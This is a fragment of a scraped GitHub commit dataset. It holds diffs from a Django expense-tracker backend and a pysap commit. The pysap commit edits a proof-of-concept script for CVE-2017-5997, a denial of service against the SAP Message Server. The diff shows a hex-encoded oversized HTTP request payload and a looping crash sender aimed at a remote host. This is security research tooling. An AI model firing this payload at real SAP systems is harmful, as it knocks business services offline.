serializer\n        serializer.save(owner=owner)\n\n    def perform_update(self, serializer):\n        owner = self.request.user\n        # In case there is a quantity update\n        if serializer.validated_data.get('quantity'):\n            # In case coin_type is not changed, coin_from as the same\n            if not serializer.validated_data.get('coin_type'):\n                coin_from = serializer.instance.coin_type\n            # In case coin_type is changed, coin_from is the new coin_type\n            else: coin_from = serializer.validated_data['coin_type']\n            coin_to = owner.pref_coin_type\n            quantity = serializer.validated_data['quantity']\n            converted_new_quantity = convert_or_fetch(\n                coin_from, coin_to, quantity\n            )\n            converted_old_quantity = convert_or_fetch(\n                serializer.instance.coin_type, coin_to, \n                serializer.instance.quantity\n            )\n            owner.balance -= converted_new_quantity \\\n                - converted_old_quantity\n            owner.balance = round(owner.balance, 2)\n            owner.save()\n            # Create DateBalance or update it\n            check_dates_and_update_date_balances(\n                serializer.instance, \n                converted_old_quantity,\n                converted_new_quantity,\n                serializer.validated_data.get('date')\n            )\n        # In case there is a change of date without quantity \n        # month and year needs to be checked\n        elif serializer.validated_data.get('date'):\n            coin_from = serializer.validated_data['coin_type'] \\\n                if serializer.validated_data.get('coin_type') \\\n                else serializer.instance.coin_type\n            converted_quantity = convert_or_fetch(\n                coin_from, owner.pref_coin_type, \n                serializer.instance.quantity\n            )\n            # Create DateBalance or update it\n            check_dates_and_update_date_balances(\n                serializer.instance, converted_quantity, None,\n                serializer.validated_data['date']\n            )\n        # In case there is a coin_type update without a quantity update\n        # the quantity will remains the same as before, so it wont be\n        # converted\n        serializer.save()\n\n    def perform_destroy(self, instance):\n        owner = self.request.user\n        coin_to = owner.pref_coin_type\n        converted_quantity = convert_or_fetch(\n            instance.coin_type, coin_to, \n            instance.quantity\n        )\n        owner.balance += converted_quantity\n        owner.balance = round(owner.balance, 2)\n        owner.save()\n        # Create AnnualBalance or update it\n        update_or_create_annual_balance(\n            - converted_quantity, owner, \n            instance.date.year, False\n        )\n        # Create MonthlyBalance or update it\n        update_or_create_monthly_balance(\n            - converted_quantity, owner,\n            instance.date.year, instance.date.month, False\n        )\n        instance.delete()"},"\/backend\/djangorest\/expense\/migrations\/0001_initial.py":{"changes":[{"diff":"\n     initial = True\n \n     dependencies = [\n-        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n         ('coin', '0001_initial'),\n+        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n     ]\n \n     operations = [\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/expense\/migrations\/0001_initial.py","badparts":["        migrations.swappable_dependency(settings.AUTH_USER_MODEL),"],"goodparts":["        migrations.swappable_dependency(settings.AUTH_USER_MODEL),"]},{"diff":"\n             fields=[\n                 ('id', models.BigAutoField(editable=False, primary_key=True, serialize=False)),\n                 ('name', models.CharField(max_length=40, verbose_name='name')),\n-                ('description', models.CharField(default='', max_length=2000, verbose_name='description')),\n+                ('description', models.CharField(blank=True, default='', max_length=2000, verbose_name='description')),\n                 ('quantity', models.FloatField(validators=[django.core.validators.MinValueValidator(0.0)], verbose_name='quantity')),\n                 ('date', models.DateField(verbose_name='date')),\n                 ('created', models.DateTimeF","add":1,"remove":1,"filename":"\/backend\/djangorest\/expense\/migrations\/0001_initial.py","badparts":["                ('description', models.CharField(default='', max_length=2000, verbose_name='description')),"],"goodparts":["                ('description', models.CharField(blank=True, default='', max_length=2000, verbose_name='description')),"]}],"source":"\n from django.conf import settings import django.core.validators from django.db import migrations, models import django.db.models.deletion class Migration(migrations.Migration): initial=True dependencies=[ migrations.swappable_dependency(settings.AUTH_USER_MODEL), ('coin', '0001_initial'), ] operations=[ migrations.CreateModel( name='ExpenseType', fields=[ ('name', models.CharField(max_length=15, primary_key=True, serialize=False, verbose_name='name')), ('image', models.ImageField(default='core\/default_image.jpg', upload_to='expense', verbose_name='image')), ], options={ 'verbose_name': 'Expense type', 'verbose_name_plural': 'Expense types', 'ordering':['name'], }, ), migrations.CreateModel( name='Expense', fields=[ ('id', models.BigAutoField(editable=False, primary_key=True, serialize=False)), ('name', models.CharField(max_length=40, verbose_name='name')), ('description', models.CharField(default='', max_length=2000, verbose_name='description')), ('quantity', models.FloatField(validators=[django.core.validators.MinValueValidator(0.0)], verbose_name='quantity')), ('date', models.DateField(verbose_name='date')), ('created', models.DateTimeField(auto_now_add=True)), ('updated', models.DateTimeField(auto_now_add=True)), ('coin_type', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to='coin.cointype', verbose_name='coin type')), ('exp_type', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to='expense.expensetype', verbose_name='expense type')), ('owner', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL, verbose_name='owner')), ], options={ 'verbose_name': 'Expense', 'verbose_name_plural': 'Expenses', 'ordering':['-date'], 'abstract': False, }, ), ] ","sourceWithComments":"# Generated by Django 4.0.7 on 2022-10-22 21:39\n\nfrom django.conf import settings\nimport django.core.validators\nfrom django.db import migrations, models\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    initial = True\n\n    dependencies = [\n        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n        ('coin', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='ExpenseType',\n            fields=[\n                ('name', models.CharField(max_length=15, primary_key=True, serialize=False, verbose_name='name')),\n                ('image', models.ImageField(default='core\/default_image.jpg', upload_to='expense', verbose_name='image')),\n            ],\n            options={\n                'verbose_name': 'Expense type',\n                'verbose_name_plural': 'Expense types',\n                'ordering': ['name'],\n            },\n        ),\n        migrations.CreateModel(\n            name='Expense',\n            fields=[\n                ('id', models.BigAutoField(editable=False, primary_key=True, serialize=False)),\n                ('name', models.CharField(max_length=40, verbose_name='name')),\n                ('description', models.CharField(default='', max_length=2000, verbose_name='description')),\n                ('quantity', models.FloatField(validators=[django.core.validators.MinValueValidator(0.0)], verbose_name='quantity')),\n                ('date', models.DateField(verbose_name='date')),\n                ('created', models.DateTimeField(auto_now_add=True)),\n                ('updated', models.DateTimeField(auto_now_add=True)),\n                ('coin_type', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to='coin.cointype', verbose_name='coin type')),\n                ('exp_type', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to='expense.expensetype', verbose_name='expense type')),\n                ('owner', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL, verbose_name='owner')),\n            ],\n            options={\n                'verbose_name': 'Expense',\n                'verbose_name_plural': 'Expenses',\n                'ordering': ['-date'],\n                'abstract': False,\n            },\n        ),\n    ]\n"},"\/backend\/djangorest\/expense\/tests\/test_logic.py":{"changes":[{"diff":"\n     def get_expense_data(self):\n         return {\n             'name': 'Test name',\n-            'description': 'Test description',\n+            'description': '',\n             'quantity': 2.0,\n             'coin_type': self.coin_type.code,\n             'exp_","add":1,"remove":1,"filename":"\/backend\/djangorest\/expense\/tests\/test_logic.py","badparts":["            'description': 'Test description',"],"goodparts":["            'description': '',"]}],"source":"\nfrom django.utils.timezone import now import json from rest_framework.test import APITestCase from rest_framework import status from django.urls import reverse from coin.models import CoinType from custom_auth.models import InvitationCode, User import logging from expense.models import Expense, ExpenseType class ExpenseLogicTests(APITestCase): def setUp(self): logging.disable(logging.WARNING) self.jwt_obtain_url=reverse('jwt_obtain_pair') self.expense_url=reverse('expense-list') self.inv_code=InvitationCode.objects.create() self.coin_type=CoinType.objects.create(code='EUR') self.user_data={ 'username':\"username\", 'email':\"email@test.com\", \"password\": \"password1@212\", \"password2\": \"password1@212\", 'inv_code': str(self.inv_code.code), 'pref_coin_type': str(self.coin_type.code) } self.credentials={ 'email':\"email@test.com\", \"password\": \"password1@212\" } self.user=self.create_user() self.exp_type=ExpenseType.objects.create(name=\"test\") def get(self, url): return self.client.get(url) def post(self, url, data={}): return self.client.post( url, json.dumps(data), content_type=\"application\/json\" ) def patch(self, url, data={}): return self.client.patch( url, json.dumps(data), content_type=\"application\/json\" ) def delete(self, url): return self.client.delete(url) def authenticate_user(self, credentials): jwt=self.post(self.jwt_obtain_url, credentials).data['access'] self.client.credentials(HTTP_AUTHORIZATION='Bearer ' +str(jwt)) def get_expense_data(self): return{ 'name': 'Test name', 'description': 'Test description', 'quantity': 2.0, 'coin_type': self.coin_type.code, 'exp_type': self.exp_type.name, 'date': str(now().date()), 'owner': str(self.user), } def create_user(self): user=User.objects.create( username=self.user_data['username'], email=self.user_data['email'], inv_code=self.inv_code, verified=True, balance=10, pref_coin_type=self.coin_type, ) user.set_password(self.user_data['password']) user.save() return user def authenticate_add_expense(self): self.authenticate_user(self.credentials) data=self.get_expense_data() self.post(self.expense_url, data) def test_expense_post(self): \"\"\" Checks balance gets updated with Expense post \"\"\" data=self.get_expense_data() self.authenticate_user(self.credentials) self.post(self.expense_url, data) user=User.objects.get(email=self.user_data['email']) self.assertEqual(user.balance, 8) data['quantity']=-10.0 response=self.post(self.expense_url, data) self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST) self.assertIn('quantity', response.data) def test_expense_patch(self): \"\"\" Checks balance gets updated with Expense patch(similar to put) \"\"\" data=self.get_expense_data() self.authenticate_user(self.credentials) self.post(self.expense_url, data) expense=Expense.objects.get(name='Test name') self.patch(self.expense_url+'\/'+str(expense.id),{'quantity': 5.0}) user=User.objects.get(email=self.user_data['email']) self.assertEqual(user.balance, 5) def test_expense_delete_url(self): \"\"\" Checks balance gets updated with Expense delete \"\"\" data=self.get_expense_data() self.authenticate_user(self.credentials) self.post(self.expense_url, data) data2=data data2['name']='test' self.post(self.expense_url, data2) expense=Expense.objects.get(name='Test name') self.delete(self.expense_url+'\/'+str(expense.id)) user=User.objects.get(email=self.user_data['email']) self.assertEqual(user.balance, 8) ","sourceWithComments":"from django.utils.timezone import now\nimport json\nfrom rest_framework.test import APITestCase\nfrom rest_framework import status\nfrom django.urls import reverse\nfrom coin.models import CoinType\nfrom custom_auth.models import InvitationCode, User\nimport logging\nfrom expense.models import Expense, ExpenseType\n\n\nclass ExpenseLogicTests(APITestCase):\n    def setUp(self):\n        # Avoid WARNING logs while testing wrong requests \n        logging.disable(logging.WARNING)\n\n        self.jwt_obtain_url=reverse('jwt_obtain_pair')\n        self.expense_url=reverse('expense-list')\n        # Create InvitationCodes\n        self.inv_code = InvitationCode.objects.create()\n        self.coin_type = CoinType.objects.create(code='EUR')\n        self.user_data={\n            'username':\"username\",\n            'email':\"email@test.com\",\n            \"password\": \"password1@212\",\n            \"password2\": \"password1@212\",\n            'inv_code': str(self.inv_code.code),\n            'pref_coin_type': str(self.coin_type.code)\n        }\n        self.credentials = {\n            'email':\"email@test.com\",\n            \"password\": \"password1@212\"\n        }\n        self.user = self.create_user()\n        self.exp_type = ExpenseType.objects.create(name=\"test\")\n    \n    def get(self, url) :\n        return self.client.get(url)\n    \n    def post(self, url, data={}) :\n        return self.client.post(\n            url, json.dumps(data),\n            content_type=\"application\/json\"\n        )\n    \n    def patch(self, url, data={}) :\n        return self.client.patch(\n            url, json.dumps(data),\n            content_type=\"application\/json\"\n        )\n    \n    def delete(self, url) :\n        return self.client.delete(url)\n    \n    def authenticate_user(self, credentials):\n        # Get jwt token\n        jwt=self.post(self.jwt_obtain_url, credentials).data['access']\n        self.client.credentials(HTTP_AUTHORIZATION='Bearer ' + str(jwt))\n    \n    def get_expense_data(self):\n        return {\n            'name': 'Test name',\n            'description': 'Test description',\n            'quantity': 2.0,\n            'coin_type': self.coin_type.code,\n            'exp_type': self.exp_type.name,\n            'date': str(now().date()),\n            'owner': str(self.user),\n        }\n    \n    def create_user(self):\n        user = User.objects.create(\n            username=self.user_data['username'],\n            email=self.user_data['email'],\n            inv_code=self.inv_code,\n            verified=True,\n            balance= 10,\n            pref_coin_type=self.coin_type,\n        )\n        user.set_password(self.user_data['password'])\n        user.save()\n        return user\n\n    def authenticate_add_expense(self):\n        self.authenticate_user(self.credentials)\n        data = self.get_expense_data()\n        # Add new expense\n        self.post(self.expense_url, data)\n    \n    def test_expense_post(self):\n        \"\"\"\n        Checks balance gets updated with Expense post\n        \"\"\"\n        data = self.get_expense_data()\n        self.authenticate_user(self.credentials)\n        self.post(self.expense_url, data)\n        user=User.objects.get(email=self.user_data['email'])\n        self.assertEqual(user.balance, 8)\n        # Negative quantity not allowed\n        data['quantity'] = -10.0\n        response = self.post(self.expense_url, data)\n        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)\n        self.assertIn('quantity', response.data)\n    \n    def test_expense_patch(self):\n        \"\"\"\n        Checks balance gets updated with Expense patch (similar to put)\n        \"\"\"\n        data = self.get_expense_data()\n        self.authenticate_user(self.credentials)\n        self.post(self.expense_url, data)\n        expense = Expense.objects.get(name='Test name')\n        # Patch method\n        self.patch(self.expense_url+'\/'+str(expense.id), {'quantity': 5.0})\n        user = User.objects.get(email=self.user_data['email'])\n        self.assertEqual(user.balance, 5)\n\n    def test_expense_delete_url(self):\n        \"\"\"\n        Checks balance gets updated with Expense delete\n        \"\"\"\n        # Add first expense\n        data = self.get_expense_data()\n        self.authenticate_user(self.credentials)\n        self.post(self.expense_url, data)\n        data2 = data\n        data2['name']='test'\n        # Add second expense\n        self.post(self.expense_url, data2)\n        expense = Expense.objects.get(name='Test name')\n        # Delete second expense\n        self.delete(self.expense_url+'\/'+str(expense.id))\n        user = User.objects.get(email=self.user_data['email'])\n        self.assertEqual(user.balance, 8)"},"\/backend\/djangorest\/frontend_version\/api\/views.py":{"changes":[{"diff":"\n         try:\n             return Response(\n                 data= {\n-                    'version': FrontendVersion.objects.last().version\n+                    'version': FrontendVersion.objects.first().version\n                 }\n             )\n         except:\n             return Response(\n                 data= {\n-                    'version': \"0.0.1\"\n+                    'version': \"0.0.3\"\n                 }\n             )\n","add":2,"remove":2,"filename":"\/backend\/djangorest\/frontend_version\/api\/views.py","badparts":["                    'version': FrontendVersion.objects.last().version","                    'version': \"0.0.1\""],"goodparts":["                    'version': FrontendVersion.objects.first().version","                    'version': \"0.0.3\""]}],"source":"\nfrom django.utils.translation import gettext_lazy as _ from django.utils.decorators import method_decorator from django.views.decorators.cache import cache_page from frontend_version.api.serializers import FrontendVersionSerializer from frontend_version.models import FrontendVersion from rest_framework.response import Response from rest_framework.views import APIView from rest_framework.permissions import AllowAny class FrontendVersionView(APIView): serializer_class=FrontendVersionSerializer permission_classes=(AllowAny,) @method_decorator(cache_page(10)) def get(self, request, format=None): \"\"\" This view will be cached for 10 seconds \"\"\" try: return Response( data={ 'version': FrontendVersion.objects.last().version } ) except: return Response( data={ 'version': \"0.0.1\" } ) ","sourceWithComments":"from django.utils.translation import gettext_lazy as _\nfrom django.utils.decorators import method_decorator\nfrom django.views.decorators.cache import cache_page\nfrom frontend_version.api.serializers import FrontendVersionSerializer\nfrom frontend_version.models import FrontendVersion\nfrom rest_framework.response import Response\nfrom rest_framework.views import APIView\nfrom rest_framework.permissions import AllowAny\n\n\nclass FrontendVersionView(APIView):\n    serializer_class = FrontendVersionSerializer\n    permission_classes = (AllowAny,)\n\n    @method_decorator(cache_page(10))\n    def get(self, request, format=None):\n        \"\"\"\n        This view will be cached for 10 seconds\n        \"\"\"\n        try:\n            return Response(\n                data= {\n                    'version': FrontendVersion.objects.last().version\n                }\n            )\n        except:\n            return Response(\n                data= {\n                    'version': \"0.0.1\"\n                }\n            )"}},"msg":"Develop (#44)\n\n* Flutter project creation (#33)\r\n\r\n* project creation\r\n\r\n* Update README.md\r\n\r\n* Deployment changes and readme\r\n\r\n* Update build.gradle\r\n\r\n* Translations basic setup (#34)\r\n\r\n* Http, api and platform service (#35)\r\n\r\n* Auth feature + fixes (#37)\r\n\r\n* Half of service done\r\n\r\n* New deployment\r\n\r\n* Password and simple text field\r\n\r\n* Icons, images and widgets changes\r\n\r\n* Icon chaned\r\n\r\n* Build changes\r\n\r\n* App localizations implementation with riverpod\r\n\r\n* flutter_secure_storage dependency\r\n\r\n* Update backgroud image\r\n\r\n* Update README\r\n\r\n* Update .gitignore\r\n\r\n* Update README.md\r\n\r\n* Update pubspec.yaml\r\n\r\n* Update main.dart\r\n\r\n* Update env_model.dart\r\n\r\n* Structure changed\r\n\r\n* Update widget_test.dart\r\n\r\n* project reestructure\r\n\r\n* Reestructure\r\n\r\n* form validation fix\r\n\r\n* login and loading half features\r\n\r\n* Validation fixes\r\n\r\n* Package info changes\r\n\r\n* Frontend version backend (#36)\r\n\r\n* frontend version app created\r\n\r\n* version endpoint and nginx fix\r\n\r\n* version route in frontend and cors setup in backend\r\n\r\n* login almost finished\r\n\r\n* Warnins solved and packae info state created\r\n\r\n* Initial route fixed and warnings solved\r\n\r\n* Error page + minor fixes + register basis + http service refactor\r\n\r\n* Update settings.py\r\n\r\n* Django denial service vulnerability fix\r\n\r\n* register forma state and locale provider\r\n\r\n* Language picker and changes in login ui\r\n\r\n* Register done, verification code missing\r\n\r\n* Authentication almost finished, JWT refresh token bug in backend, also language and pref_coin_type bug fix\r\n\r\n* Traducciones\r\n\r\n* Update README.md\r\n\r\n* Update README.md\r\n\r\n* Update local.conf (#38)\r\n\r\n* Backend bu fixed and adaptative nav bar + app bar (#39)\r\n\r\n* Backend bu fixed and adaptative nav bar + app bar\r\n\r\n* Update app_es.arb\r\n\r\n* Icons added\r\n\r\n* Ui finished + backend changes (#40)\r\n\r\n* Update pubspec.yaml\r\n\r\n* Statistics page (#43)\r\n\r\n* Backend refactore to auth serializers and views, race condition fix and charts_flutter added for frontend\r\n\r\n* UI almost done, provides and states left\r\n\r\n* selected date model and provider\r\n\r\n* Balance month chart finished\r\n\r\n* Splash screen\r\n\r\n* Balance charts finished\r\n\r\n* Backend fixes for date balances\r\n\r\n* Backend fix for empty description\r\n\r\n* Update auth_view.dart\r\n\r\n* Update user_views.py\r\n\r\n* Pillow fix\r\n\r\n* 8 years savings complete + fix in backend for expected quantity\r\n\r\n* Currency chart done and other fixes\r\n\r\n* Version upgrade"}},"https:\/\/github.com\/gelim\/pysap":{"c3b5cd3b35db3b773a9a22185f62c4b814db224b":{"url":"https:\/\/api.github.com\/repos\/gelim\/pysap\/commits\/c3b5cd3b35db3b773a9a22185f62c4b814db224b","html_url":"https:\/\/github.com\/gelim\/pysap\/commit\/c3b5cd3b35db3b773a9a22185f62c4b814db224b","sha":"c3b5cd3b35db3b773a9a22185f62c4b814db224b","keyword":"denial of service update","diff":"diff --git a\/examples\/ms_server_denial_of_service.py b\/examples\/ms_server_denial_of_service.py\nindex d7a2031..70d918b 100644\n--- a\/examples\/ms_server_denial_of_service.py\n+++ b\/examples\/ms_server_denial_of_service.py\n@@ -1,4 +1,5 @@\n #!\/usr\/bin\/env python\n+# coding=utf-8\n # ===========\n # pysap - Python library for crafting SAP's network protocols packets\n #\n@@ -21,6 +22,8 @@\n # GNU General Public License for more details.\n # ==============\n \n+\n+\n \"\"\"\n Vulnerable SAP Kernel versions\n \n@@ -43,8 +46,8 @@\n SAP KERNEL 7.49 64-BIT UNICODE\n \n TECHNICAL DESCRIPTION\n-The message server doesn\u2019t free properly the resources allocation for handling the clients \n-request in the case where the requests size is between 4k and 65k. In this special case, \n+The message server doesn\u2019t free properly the resources allocation for handling the clients\n+request in the case where the requests size is between 4k and 65k. In this special case,\n the server answers with an empty reply as opposed to the case where the request is greater\n than 65k, then the server will reset the connection. The following shows log of the msgserver\n process being killed because of too much memory allocated:\n@@ -59,11 +62,10 @@\n from socket import error as SocketError\n from optparse import OptionParser, OptionGroup\n # External imports\n-from scapy.packet import Raw\n from scapy.config import conf\n-import requests\n # Custom imports\n import pysap\n+from pysap.SAPRouter import SAPRoutedStreamSocket\n \n \n # Set the verbosity to 0\n@@ -119,10 +121,8 @@ def send_crash(host, port, item, verbose, route=None):\n     if verbose:\n         print(\"[*] Sending crash\")\n     # Initiate the connection\n-    try:\n-        requests.get(host+\":\"+str(port)+item)\n-    except:\n-        pass\n+    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route)\n+    conn.send(item)\n \n # Main function\n def main():\n@@ -136,8 +136,8 @@ def main():\n \n     # Crafting the item\n \n-    item = \"\/msgserver\/html\/group?group=\"+'A'*65000\n-\n+    item = \"\\x47\\x45\\x54\\x20\\x2f\\x6d\\x73\\x67\\x73\\x65\\x72\\x76\\x65\\x72\\x2f\\x68\\x74\\x6d\\x6c\\x2f\\x67\\x72\\x6f\\x75\\x70\\x3f\\x67\\x72\\x6f\\x75\\x70\\x3d\" + \"\\x41\" * 65000 + \"\\x20\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x30\\x0a\\x0a\"\n+    options.route_ni_version=0\n     try:\n         if options.loop:\n             try:\n","message":"","files":{"\/examples\/ms_server_denial_of_service.py":{"changes":[{"diff":"\n \n TECHNICAL DESCRIPTION\n-The message server doesn\u2019t free properly the resources allocation for handling the clients \n-request in the case where the requests size is between 4k and 65k. In this special case, \n+The message server doesn\u2019t free properly the resources allocation for handling the clients\n+request in the case where the requests size is between 4k and 65k. In this special case,\n the server answers with an empty reply as opposed to the case where the request is greater\n than 65k, then the server will reset the connection. The following shows log of the msgserver\n process being killed because of too much memory allocated:\n","add":2,"remove":2,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["The message server doesn\u2019t free properly the resources allocation for handling the clients ","request in the case where the requests size is between 4k and 65k. In this special case, "],"goodparts":["The message server doesn\u2019t free properly the resources allocation for handling the clients","request in the case where the requests size is between 4k and 65k. In this special case,"]},{"diff":"\n from optparse import OptionParser, OptionGroup\n # External imports\n-from scapy.packet import Raw\n from scapy.config import conf\n-import requests\n # Custom imports\n import pysap\n+from pysap.SAPRouter import SAPRoutedStreamSocket\n \n \n # Set the verbosity to 0\n","add":1,"remove":2,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["from scapy.packet import Raw","import requests"],"goodparts":["from pysap.SAPRouter import SAPRoutedStreamSocket"]},{"diff":"\n     if verbose:\n         print(\"[*] Sending crash\")\n     # Initiate the connection\n-    try:\n-        requests.get(host+\":\"+str(port)+item)\n-    except:\n-        pass\n+    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route)\n+    conn.send(item)\n \n # Main function\n def main():\n","add":2,"remove":4,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["    try:","        requests.get(host+\":\"+str(port)+item)","    except:","        pass"],"goodparts":["    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route)","    conn.send(item)"]},{"diff":"\n \n     # Crafting the item\n \n-    item = \"\/msgserver\/html\/group?group=\"+'A'*65000\n-\n+    item = \"\\x47\\x45\\x54\\x20\\x2f\\x6d\\x73\\x67\\x73\\x65\\x72\\x76\\x65\\x72\\x2f\\x68\\x74\\x6d\\x6c\\x2f\\x67\\x72\\x6f\\x75\\x70\\x3f\\x67\\x72\\x6f\\x75\\x70\\x3d\" + \"\\x41\" * 65000 + \"\\x20\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x30\\x0a\\x0a\"\n+    options.route_ni_version=0\n     try:\n         if options.loop:\n             try:\n","add":2,"remove":2,"filename":"\/examples\/ms_server_denial_of_service.py","badparts":["    item = \"\/msgserver\/html\/group?group=\"+'A'*65000"],"goodparts":["    item = \"\\x47\\x45\\x54\\x20\\x2f\\x6d\\x73\\x67\\x73\\x65\\x72\\x76\\x65\\x72\\x2f\\x68\\x74\\x6d\\x6c\\x2f\\x67\\x72\\x6f\\x75\\x70\\x3f\\x67\\x72\\x6f\\x75\\x70\\x3d\" + \"\\x41\" * 65000 + \"\\x20\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x30\\x0a\\x0a\"","    options.route_ni_version=0"]}],"source":"\n \"\"\" Vulnerable SAP Kernel versions SAP KERNEL 7.21 32-BIT UNICODE SAP KERNEL 7.21 32-BITSP716 SAP KERNEL 7.21 64-BIT UNICODE SAP KERNEL 7.21 64-BITSP716 SAP KERNEL 7.21 EXT 32-BIT SAP KERNEL 7.21 EXT 32-BIT UC SAP KERNEL 7.21 EXT 64-BIT SAP KERNEL 7.21 EXT 64-BIT UC SAP KERNEL 7.22 64-BIT SAP KERNEL 7.22 64-BIT UNICODE SAP KERNEL 7.22 EXT 64-BIT SAP KERNEL 7.22 EXT 64-BIT UC SAP KERNEL 7.42 64-BIT SAP KERNEL 7.42 64-BIT UNICODE SAP KERNEL 7.45 64-BIT SAP KERNEL 7.45 64-BIT UNICODE SAP KERNEL 7.49 64-BIT UNICODE TECHNICAL DESCRIPTION The message server doesn\u2019t free properly the resources allocation for handling the clients request in the case where the requests size is between 4k and 65k. In this special case, the server answers with an empty reply as opposed to the case where the request is greater than 65k, then the server will reset the connection. The following shows log of the msgserver process being killed because of too much memory allocated: [4721576.189056] Out of memory: Kill process 14223(ms.sapJ45_SCS01) score 243 or sacrifice child [4721576.189058] Killed process 14223(ms.sapJ45_SCS01) total-vm:3321508kB, anon-rss:2468184kB, file-rss:0kB \"\"\" import logging from time import sleep from socket import error as SocketError from optparse import OptionParser, OptionGroup from scapy.packet import Raw from scapy.config import conf import requests import pysap conf.verb=0 def parse_options(): description=\"This example script can be used to tests against CVE-2017-5997 Denial of Service vulnerability\" \\ \"affecting the Message Server. For more details about the vulnerability see Advisory \" \\ \"https:\/\/erpscan.com\/advisories\/erpscan-16-038-sap-message-server-http-remote-dos\/.\" epilog=\"pysap %(version)s -%(url)s -%(repo)s\" %{\"version\": pysap.__version__, \"url\": pysap.__url__, \"repo\": pysap.__repo__} usage=\"Usage: %prog[options] -d <remote host>\" parser=OptionParser(usage=usage, description=description, epilog=epilog) target=OptionGroup(parser, \"Target\") target.add_option(\"-d\", \"--remote-host\", dest=\"remote_host\", help=\"Remote host\") target.add_option(\"-p\", \"--remote-port\", dest=\"remote_port\", type=\"int\", default=8101, help=\"Remote port[%default]\") target.add_option(\"--route-string\", dest=\"route_string\", help=\"Route string for connecting through a SAP Router\") parser.add_option_group(target) misc=OptionGroup(parser, \"Misc options\") misc.add_option(\"-l\", \"--loop\", dest=\"loop\", action=\"store_true\", default=False, help=\"Loop until the user cancel(Ctrl+C)[%default]\") misc.add_option(\"-n\", \"--number\", dest=\"number\", type=\"int\", default=10, help=\"Number of packets to send[%default]\") misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"int\", default=5, help=\"Time to wait between each round[%default]\") misc.add_option(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False, help=\"Verbose output[%default]\") misc.add_option(\"--terminal\", dest=\"terminal\", default=None, help=\"Terminal name\") parser.add_option_group(misc) (options, _)=parser.parse_args() if not(options.remote_host or options.route_string): parser.error(\"Remote host or route string is required\") return options def send_crash(host, port, item, verbose, route=None): if verbose: print(\"[*] Sending crash\") try: requests.get(host+\":\"+str(port)+item) except: pass def main(): options=parse_options() if options.verbose: logging.basicConfig(level=logging.DEBUG) print(\"[*] Testing Message Server CVE-2017-5997 DoS vulnerability on host %s:%d\" %(options.remote_host, options.remote_port)) item=\"\/msgserver\/html\/group?group=\"+'A'*65000 try: if options.loop: try: while True: send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string) sleep(options.delay) except KeyboardInterrupt: print(\"[*] Cancelled by the user\") else: for i in range(options.number): send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string) sleep(options.delay) except SocketError: print(\"[*] Connection error, take a look at the enqueue server process !\") if __name__==\"__main__\": main() ","sourceWithComments":"#!\/usr\/bin\/env python\n# ===========\n# pysap - Python library for crafting SAP's network protocols packets\n#\n# Copyright (C) 2012-2017 by Martin Gallo, Core Security\n#\n# The vulnerability had found by Mathieu Geli\n# PoC by Vahagn Vardanyan\n#\n# The library was designed and developed by Martin Gallo from the Security\n# Consulting Services team of Core Security.\n#\n# This program is free software; you can redistribute it and\/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n# ==============\n\n\"\"\"\nVulnerable SAP Kernel versions\n\nSAP KERNEL 7.21 32-BIT UNICODE\nSAP KERNEL 7.21 32-BITSP716\nSAP KERNEL 7.21 64-BIT UNICODE\nSAP KERNEL 7.21 64-BITSP716\nSAP KERNEL 7.21 EXT 32-BIT\nSAP KERNEL 7.21 EXT 32-BIT UC\nSAP KERNEL 7.21 EXT 64-BIT\nSAP KERNEL 7.21 EXT 64-BIT UC\nSAP KERNEL 7.22 64-BIT\nSAP KERNEL 7.22 64-BIT UNICODE\nSAP KERNEL 7.22 EXT 64-BIT\nSAP KERNEL 7.22 EXT 64-BIT UC\nSAP KERNEL 7.42 64-BIT\nSAP KERNEL 7.42 64-BIT UNICODE\nSAP KERNEL 7.45 64-BIT\nSAP KERNEL 7.45 64-BIT UNICODE\nSAP KERNEL 7.49 64-BIT UNICODE\n\nTECHNICAL DESCRIPTION\nThe message server doesn\u2019t free properly the resources allocation for handling the clients \nrequest in the case where the requests size is between 4k and 65k. In this special case, \nthe server answers with an empty reply as opposed to the case where the request is greater\nthan 65k, then the server will reset the connection. The following shows log of the msgserver\nprocess being killed because of too much memory allocated:\n\n[4721576.189056] Out of memory: Kill process 14223 (ms.sapJ45_SCS01) score 243 or sacrifice child\n[4721576.189058] Killed process 14223 (ms.sapJ45_SCS01) total-vm:3321508kB, anon-rss:2468184kB, file-rss:0kB\n\"\"\"\n\n# Standard imports\nimport logging\nfrom time import sleep\nfrom socket import error as SocketError\nfrom optparse import OptionParser, OptionGroup\n# External imports\nfrom scapy.packet import Raw\nfrom scapy.config import conf\nimport requests\n# Custom imports\nimport pysap\n\n\n# Set the verbosity to 0\nconf.verb = 0\n\n\n# Command line options parser\ndef parse_options():\n\n    description = 